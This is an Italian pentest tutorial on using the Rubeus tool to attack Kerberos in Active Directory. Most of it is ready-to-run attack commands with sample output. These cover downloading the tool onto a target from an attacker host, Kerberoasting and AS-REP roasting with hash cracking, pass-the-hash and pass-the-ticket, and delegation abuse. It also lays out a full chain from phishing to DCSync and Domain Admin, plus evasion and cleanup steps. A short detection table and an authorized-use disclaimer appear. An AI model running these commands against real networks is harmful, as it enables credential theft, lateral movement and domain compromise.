---
title: 'Rubeus: Kerberos Abuse e Ticket Manipulation in Active Directory'
slug: rubeus
description: 'Rubeus: Kerberos Abuse e Ticket Manipulation in Active Directory'
image: /Gemini_Generated_Image_n5kq2an5kq2an5kq.webp
draft: false
date: 2026-02-24T00:00:00.000Z
categories:
  - windows
subcategories:
  - active-directory
tags:
  - ad
  - kerberos
---

Rubeus è un tool C# per interagire con il protocollo [Kerberos](https://hackita.it/articoli/kerberos) in ambienti Active Directory. Sviluppato da GhostPack, permette di eseguire AS-REP Roasting, Kerberoasting, richiesta e manipolazione di ticket TGT/TGS, e abuse di delegation. Se devi attaccare Kerberos, Rubeus è il tool di riferimento. In questa guida impari a sfruttare Kerberos per credential access e lateral movement.

### Posizione nella Kill Chain

Rubeus interviene nelle fasi di credential access e lateral movement:

```
Foothold → AD Enumeration → [RUBEUS] → Credential Extraction → Lateral Movement → Domain Compromise
```

## 1️⃣ Setup e Installazione

### Download Pre-compilato

```bash
# Download release
wget https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe
```

### Compilazione da Source

```bash
git clone https://github.com/GhostPack/Rubeus.git
cd Rubeus
```

Apri `Rubeus.sln` in Visual Studio, compila in Release. Output in `bin/Release/Rubeus.exe`.

### Trasferimento su Target

```powershell
# PowerShell
IWR http://192.168.1.50/Rubeus.exe -OutFile C:\Windows\Temp\r.exe

# Certutil
certutil -urlcache -split -f http://192.168.1.50/Rubeus.exe C:\Windows\Temp\r.exe

# Execute-assembly (Cobalt Strike)
execute-assembly /tools/Rubeus.exe kerberoast
```

### Verifica Funzionamento

```cmd
C:\Windows\Temp\Rubeus.exe help
```

Output:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__   ____ _   _  ___
  |  __  /| | | |  _ \ / _  ) | | |/___)
  | |  \ \| |_| | |_) ( (/ /| |_| |___ |
  |_|   |_|____/|____/ \____)____/(___/

  v2.2.3

Ticket requests andடRenewals:
    asktgt          Request a TGT
    ...
```

### Requisiti

* .NET Framework 4.0+
* Domain-joined system
* Valid domain credentials (per alcune operazioni)
* Windows 7+ / Server 2008+

## 2️⃣ Uso Base

### Azioni Principali

| Comando      | Descrizione                   |
| ------------ | ----------------------------- |
| `asktgt`     | Richiedi TGT per utente       |
| `asktgs`     | Richiedi TGS per servizio     |
| `kerberoast` | Estrai hash kerberoastable    |
| `asreproast` | Estrai hash senza pre-auth    |
| `s4u`        | Service for User (delegation) |
| `ptt`        | Pass-the-Ticket               |
| `dump`       | Dump ticket dalla memoria     |
| `monitor`    | Monitor nuovi TGT             |

### Sintassi Base

```cmd
Rubeus.exe <action> [/argument:value] [/argument2:value2]
```

### Verifica Ticket Correnti

```cmd
Rubeus.exe klist
```

Output:

```
Current User : CORP\john.doe

[*] Cached Tickets: (2)

    ServiceName    : krbtgt/CORP.LOCAL
    UserName       : john.doe
    StartTime      : 1/15/2024 9:00:00 AM
    EndTime        : 1/15/2024 7:00:00 PM
    RenewTill      : 1/22/2024 9:00:00 AM
```

## 3️⃣ Tecniche Operative

### [Kerberoasting](https://hackita.it/articoli/kerberoasting)

Estrai hash di account con SPN configurato:

```cmd
Rubeus.exe kerberoast /stats
```

Output:

```
[*] Searching for Kerberoastable users
[*] Found 3 Kerberoastable accounts:

    svc_sql (SQL Service) - AES256
    svc_web (Web Service) - RC4_HMAC
    svc_backup (Backup Service) - RC4_HMAC
```

```cmd
# Estrai hash
Rubeus.exe kerberoast /outfile:hashes.txt
```

Output:

```
[*] Roasting svc_sql
[*] Hash written to: hashes.txt

$krb5tgs$23$*svc_sql$CORP.LOCAL$sql/server.corp.local*$abc123...
$krb5tgs$23$*svc_web$CORP.LOCAL$http/web.corp.local*$def456...
```

Crack con [Hashcat](https://hackita.it/articoli/hashcat):

```bash
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting

Per account senza Kerberos Pre-Authentication:

```cmd
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

Output:

```
[*] Searching for accounts without pre-auth
[*] Found vulnerable user: svc_legacy

$krb5asrep$23$svc_legacy@CORP.LOCAL:abc123...
```

Crack:

```bash
hashcat -m 18200 asrep.txt wordlist.txt
```

### Request TGT

Con password:

```cmd
Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:corp.local
```

Con hash NTLM (Pass-the-Hash over Kerberos):

```cmd
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:corp.local /ptt
```

### Pass-the-Ticket

```cmd
# Import ticket
Rubeus.exe ptt /ticket:base64_ticket_here

# Verifica
Rubeus.exe klist
```

## 4️⃣ Tecniche Avanzate

### Unconstrained Delegation Abuse

Se trovi host con unconstrained delegation:

```cmd
# Monitor per TGT in arrivo
Rubeus.exe monitor /interval:5 /nowrap

# Quando admin si connette, cattura TGT
# Poi usa per impersonation
Rubeus.exe ptt /ticket:captured_tgt
```

### Constrained Delegation Abuse (S4U)

```cmd
# S4U2Self + S4U2Proxy
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/server.corp.local /ptt
```

Risultato: ticket per administrator su cifs/server.

### Resource-Based Constrained Delegation

```cmd
# Con computer account controllato
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /altservice:http /ptt
```

### Overpass-the-Hash

Converti NTLM hash in Kerberos ticket:

```cmd
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Ora puoi usare Kerberos auth
dir \\server\share
```

## 5️⃣ Scenari Pratici di Pentest

### Scenario 1: Kerberoasting Attack

**Timeline: 15 minuti**

Obiettivo: ottenere credenziali service account.

```cmd
# COMANDO: Verifica target disponibili
Rubeus.exe kerberoast /stats
```

## RISULTATO PREVISO

```
[*] Total kerberoastable users: 5

    svc_sql - RC4_HMAC (crackable)
    svc_web - RC4_HMAC (crackable)
    svc_backup - AES256 (harder)
```

```cmd
# COMANDO: Estrai hash RC4 (più facili da crackare)
Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
```

## OUTPUT PREVISTO

```
[*] Using /tgtdeleg for AES downgrade
[*] Hash written to hashes.txt

$krb5tgs$23$*svc_sql$CORP.LOCAL$...
$krb5tgs$23$*svc_web$CORP.LOCAL$...
```

```bash
# COMANDO: Crack offline (attacker machine)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

## RISPOSTA ATTESA

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$...:Summer2024!
```

### COSA FARE SE FALLISCE

* **"No kerberoastable users"**: Nessun SPN configurato. Cerca altri vettori.
* **AES only**: Usa `/tgtdeleg` per downgrade o accetta crack time più lungo.
* **Hash non cracka**: Password complessa. Prova wordlist più grande o rules.

### Scenario 2: AS-REP Roasting

**Timeline: 10 minuti**

Target: account senza pre-authentication.

```cmd
# COMANDO
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

## COMPORTAMENTO ATTESO

```
[*] Found user without preauth: svc_legacy
[*] Hash written to asrep.txt

$krb5asrep$23$svc_legacy@CORP.LOCAL:...
```

```bash
# COMANDO: Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

## ESITO PREVISTO

```
$krb5asrep$23$svc_legacy@CORP.LOCAL:...:LegacyPass123
```

### COSA FARE SE FALLISCE

* **"No vulnerable users"**: Pre-auth abilitato su tutti. Enum manuale con PowerView.
* **Access denied**: Non hai permessi LDAP. Prova con credenziali.

### Scenario 3: Pass-the-Ticket Lateral Movement

**Timeline: 10 minuti**

Hai TGT di admin, vuoi muoverti lateralmente.

```cmd
# COMANDO: Request TGT con hash
Rubeus.exe asktgt /user:admin /rc4:aad3b435b51404eeaad3b435b51404ee /domain:corp.local /ptt
```

## OUTPUT GENERATO

```
[*] Action: Ask TGT
[*] Building AS-REQ for admin@CORP.LOCAL
[*] TGT request successful!
[*] Ticket imported to current session
```

```cmd
# COMANDO: Verifica accesso
dir \\DC01\C$
```

##

```
 Directory of \\DC01\C$

01/15/2024  09:00 AM    <DIR>          Windows
01/15/2024  09:00 AM    <DIR>          Program Files
```

### COSA FARE SE FALLISCE

* **Clock skew**: Sincronizza orario con DC: `w32tm /resync`.
* **"KRB\_AP\_ERR\_SKEW"**: Differenza orario > 5 minuti.
* **Access denied**: Ticket valido ma utente non ha accesso a quella risorsa.

## 6️⃣ Toolchain Integration

### Flusso Operativo

```
BloodHound (path) → Rubeus (credential) → Lateral Movement → Domain Admin
```

### Integrazione con Altri Tool

```cmd
# BloodHound identifica kerberoastable users
# Rubeus estrae hash
Rubeus.exe kerberoast /outfile:hashes.txt

# Hashcat cracka
hashcat -m 13100 hashes.txt wordlist.txt

# CrackMapExec per lateral movement
crackmapexec smb servers.txt -u svc_sql -p 'Summer2024!'
```

### Confronto: Rubeus vs Alternative

| Feature          | Rubeus | Mimikatz | Impacket     | Invoke-Kerberoast |
| ---------------- | ------ | -------- | ------------ | ----------------- |
| Linguaggio       | C#     | C        | Python       | PowerShell        |
| Kerberoast       | ✓      | ✓        | ✓            | ✓                 |
| AS-REP           | ✓      | ✗        | ✓            | ✗                 |
| Delegation       | ✓✓     | Parziale | ✓            | ✗                 |
| Stealth          | Alto   | Medio    | N/A (remote) | Medio             |
| Execute-assembly | ✓      | ✗        | N/A          | ✓                 |

## 7️⃣ Attack Chain Completa

### Scenario: Kerberos-Based Domain Compromise

**Timeline totale: 90 minuti**

**Fase 1: Initial Access (15 min)**

```
Phishing → Meterpreter → Domain user context
```

**Fase 2: AD Enumeration (15 min)**

```cmd
# BloodHound collection
SharpHound.exe -c All

# Identifica kerberoastable high-value targets
```

**Fase 3: Kerberoasting (10 min)**

```cmd
Rubeus.exe kerberoast /outfile:hashes.txt
```

**Fase 4: Offline Cracking (20 min)**

```bash
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
```

Risultato: svc\_backup:Backup2024!

**Fase 5: Privilege Check (10 min)**

```cmd
# svc_backup è in Backup Operators
# Può DCSync!
```

**Fase 6: DCSync (10 min)**

```cmd
# Con credenziali svc_backup
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:administrator"
```

**Fase 7: Domain Admin (10 min)**

```cmd
# Pass-the-Hash to DC
Rubeus.exe asktgt /user:administrator /rc4:ADMIN_HASH /ptt
dir \\DC01\C$
```

## 8️⃣ Detection & Evasion

### Cosa Monitora il Blue Team

| Indicator              | Event ID  | Detection                         |
| ---------------------- | --------- | --------------------------------- |
| TGS request (roasting) | 4769      | Anomalous service ticket requests |
| AS-REQ without preauth | 4768      | RC4 encryption type               |
| Ticket granting        | 4768/4769 | Volume anomalo                    |
| Delegation abuse       | 4769      | S4U2Self/Proxy                    |

### Tecniche di Evasion

**1. AES Downgrade**

```cmd
# Forza RC4 per evitare detection AES
Rubeus.exe kerberoast /tgtdeleg
```

**2. Targeted Roasting**

```cmd
# Solo user specifici invece di tutti
Rubeus.exe kerberoast /user:svc_sql
```

**3. Opsec Mode**

```cmd
# Riduci noise
Rubeus.exe kerberoast /opsec
```

### Cleanup

```cmd
# Rimuovi ticket importati
Rubeus.exe purge

# Rimuovi tool
del C:\Windows\Temp\r.exe
```

## 9️⃣ Performance & Scaling

### Benchmark

| Operazione            | Tempo    |
| --------------------- | -------- |
| kerberoast (10 users) | \~5 sec  |
| asreproast (scan)     | \~10 sec |
| asktgt                | \~1 sec  |
| s4u chain             | \~3 sec  |

### Risorse

* **CPU**: Minimo
* **RAM**: \~30MB
* **Network**: LDAP queries, Kerberos traffic
* **Disco**: Solo binario (\~300KB)

## 🔟 Tabelle Tecniche

### Comandi Principali

| Comando    | Descrizione           | Esempio                                            |
| ---------- | --------------------- | -------------------------------------------------- |
| kerberoast | Extract SPN hashes    | `Rubeus.exe kerberoast`                            |
| asreproast | Extract AS-REP hashes | `Rubeus.exe asreproast`                            |
| asktgt     | Request TGT           | `Rubeus.exe asktgt /user:X /password:Y`            |
| asktgs     | Request TGS           | `Rubeus.exe asktgs /ticket:X /service:Y`           |
| ptt        | Import ticket         | `Rubeus.exe ptt /ticket:X`                         |
| s4u        | Delegation abuse      | `Rubeus.exe s4u /user:X /rc4:Y /impersonateuser:Z` |
| dump       | Dump tickets          | `Rubeus.exe dump`                                  |
| monitor    | Monitor TGTs          | `Rubeus.exe monitor /interval:5`                   |

### Hash Types per Hashcat

| Attack           | Hashcat Mode | Format            |
| ---------------- | ------------ | ----------------- |
| Kerberoast (RC4) | 13100        | $krb5tgs$23$...   |
| Kerberoast (AES) | 19700        | $krb5tgs$18$...   |
| AS-REP (RC4)     | 18200        | $krb5asrep$23$... |

## 1️⃣1️⃣ Troubleshooting

### "KRB\_AP\_ERR\_SKEW"

Clock non sincronizzato con DC.

```cmd
# Fix
w32tm /resync /force
net time \\DC01 /set /y
```

### "KDC\_ERR\_PREAUTH\_REQUIRED"

Account ha pre-auth. Non vulnerable a AS-REP roasting.

### Kerberoast Restituisce Zero Hash

Nessun SPN configurato o ACL restrictions.

```powershell
# Verifica manuale
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

### S4U Fallisce

Verificare:

1. Account ha delegation configurata
2. Target SPN esiste
3. msDS-AllowedToDelegateTo corretto

## 1️⃣2️⃣ FAQ

**Rubeus vs Mimikatz per Kerberos?**

Rubeus ha più feature Kerberos e migliore delegation abuse. Mimikatz eccelle in credential extraction dalla memoria.

**Serve essere admin?**

No per kerberoast/asreproast. Sì per dump ticket da LSASS.

**Come scelgo target kerberoast?**

Prioritizza RC4 encryption, high-privilege accounts, service accounts.

**Quanto tempo per crackare?**

RC4: minuti/ore con buona wordlist. AES: molto più lungo.

**S4U funziona sempre?**

Solo se delegation è configurata. Verifica con [BloodHound](https://hackita.it/articoli/bloodhound).

**Rubeus è rilevato?**

Signature esistono. Usa execute-assembly o compila con modifiche.

## 1️⃣3️⃣ Cheat Sheet

| Operazione         | Comando                                                                          |
| ------------------ | -------------------------------------------------------------------------------- |
| Kerberoast         | `Rubeus.exe kerberoast /outfile:h.txt`                                           |
| AS-REP roast       | `Rubeus.exe asreproast /format:hashcat`                                          |
| Request TGT (pass) | `Rubeus.exe asktgt /user:X /password:Y /ptt`                                     |
| Request TGT (hash) | `Rubeus.exe asktgt /user:X /rc4:HASH /ptt`                                       |
| Pass-the-Ticket    | `Rubeus.exe ptt /ticket:base64`                                                  |
| S4U attack         | `Rubeus.exe s4u /user:X /rc4:Y /impersonateuser:admin /msdsspn:cifs/target /ptt` |
| Dump tickets       | `Rubeus.exe dump`                                                                |
| List tickets       | `Rubeus.exe klist`                                                               |
| Purge tickets      | `Rubeus.exe purge`                                                               |
| Monitor TGT        | `Rubeus.exe monitor /interval:5`                                                 |

***

*Uso consentito solo in ambienti autorizzati. Per penetration test professionali: [hackita.it/servizi](https://hackita.it/servizi). Supporta HackIta: [hackita.it/supporto](https://hackita.it/supporto).*

**Repository**: [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
